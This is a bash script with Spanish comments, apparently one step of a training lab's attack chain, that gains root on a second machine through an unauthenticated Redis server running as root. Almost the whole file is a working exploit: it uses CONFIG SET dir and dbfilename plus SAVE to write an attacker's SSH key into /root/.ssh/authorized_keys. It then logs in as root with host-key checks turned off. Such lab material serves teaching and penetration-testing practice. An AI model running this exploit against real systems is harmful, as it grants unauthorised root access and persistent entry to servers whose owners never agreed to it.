#!/usr/bin/env bash
# ============================================================================
#  lab/chain/02-m1-to-m2.sh — salto 2: M1 (www-data) → M2 (root)
# ----------------------------------------------------------------------------
#  Vulnerabilidad: Redis 6.2.6 escuchando en 0.0.0.0:6379 SIN autenticación
#  y ejecutándose como root. Con CONFIG SET dir/dbfilename + SAVE, Redis
#  escribe un archivo arbitrario como root. Se usa para dejar una llave SSH
#  en /root/.ssh/authorized_keys y entrar como root.
#
#  No se usa ninguna contraseña ni archivo de credenciales.
#
#  Uso:
#    bash lab/chain/02-m1-to-m2.sh            # imprime los comandos
#    bash lab/chain/02-m1-to-m2.sh --run      # ejecuta el ataque
# ============================================================================

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_LOG
. "$HERE/../common/lib.sh"
LAB_ROLE=chain

RUN=0
WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"
KEY="$WORK/id_lab"
REDIS_PORT="${REDIS_PORT:-6379}"

while (($#)); do
  case "$1" in
    --run) RUN=1; shift ;;
    --key) KEY="${2:?}"; shift 2 ;;
    -h|--help) echo "Uso: $0 [--run] [--key RUTA]"; exit 0 ;;
    *) die "opción desconocida: $1" ;;
  esac
done

lab_banner
step "salto 2 · M1 (${M1}, www-data) → M2 (${M2}, root)"
cat <<EOF
Vulnerabilidad: Redis sin autenticación, ejecutándose como root.

  redis-cli -h $M2 -p $REDIS_PORT PING
  redis-cli -h $M2 CONFIG SET dir /root/.ssh
  redis-cli -h $M2 CONFIG SET dbfilename authorized_keys
  printf '\\n\\n%s\\n\\n' "\$(cat $KEY.pub)" | redis-cli -h $M2 -x SET x
  redis-cli -h $M2 SAVE
  ssh -i $KEY root@$M2 'id; hostname'
EOF

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se ejecuta nada. Para atacar: --run\n' >&2
  exit 0
fi

need_cmd redis-cli
need_cmd ssh
need_cmd ssh-keygen

step "llave del laboratorio"
mkdir -p "$WORK"; chmod 700 "$WORK"
if [[ ! -f "$KEY" ]]; then
  ssh-keygen -t ed25519 -N '' -C 'lab-chain' -f "$KEY" >/dev/null
  ok "llave generada: $KEY"
else
  ok "llave existente: $KEY"
fi

step "comprobando Redis sin autenticación"
pong="$(redis-cli -h "$M2" -p "$REDIS_PORT" --no-auth-warning PING 2>/dev/null || true)"
[[ "$pong" == "PONG" ]] || die "Redis en $M2:$REDIS_PORT no responde sin auth (¿M2 arriba?)"
ok "Redis responde PONG sin credenciales"
role="$(redis-cli -h "$M2" -p "$REDIS_PORT" CONFIG GET dir 2>/dev/null | tail -n1)"
log "dir actual de Redis: ${role:-?}"

step "escribiendo /root/.ssh/authorized_keys vía Redis"
redis-cli -h "$M2" -p "$REDIS_PORT" CONFIG SET dir /root/.ssh >/dev/null
redis-cli -h "$M2" -p "$REDIS_PORT" CONFIG SET dbfilename authorized_keys >/dev/null
{ printf '\n\n'; cat "$KEY.pub"; printf '\n\n'; } | \
  redis-cli -h "$M2" -p "$REDIS_PORT" -x SET lab_pwn >/dev/null
redis-cli -h "$M2" -p "$REDIS_PORT" SAVE >/dev/null
ok "archivo escrito por Redis (root)"

step "entrando como root a M2"
SSH_OPTS=(-i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8)
if ssh "${SSH_OPTS[@]}" "root@$M2" 'id; hostname'; then
  ok "root en M2 por Redis sin autenticación"
else
  die "la llave no funcionó; revisar /root/.ssh (700) y que sshd permita llaves"
fi

step "siguiente salto"
printf '  bash %s/03-m2-to-m3.sh --run\n' "$HERE" >&2
